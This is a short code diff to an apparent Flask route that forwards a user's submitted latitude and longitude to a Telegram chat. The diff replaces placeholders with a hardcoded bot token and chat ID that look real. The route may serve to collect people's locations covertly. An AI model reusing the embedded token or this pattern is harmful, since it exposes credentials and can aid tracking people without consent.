@@ -13,8 +13,8 @@ def send_location():
     longitude = request.form['longitude']
     
     # Send the location to Telegram using the Telegram Bot API
-    bot_token = 'YOUR_BOT_TOKEN'
-    chat_id = 'YOUR_CHAT_ID'
+    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
+    chat_id = '373715044'
     api_url = f"https://api.telegram.org/bot{bot_token}/sendLocation?chat_id={chat_id}&latitude={latitude}&longitude={longitude}"
     
     response = requests.get(api_url)
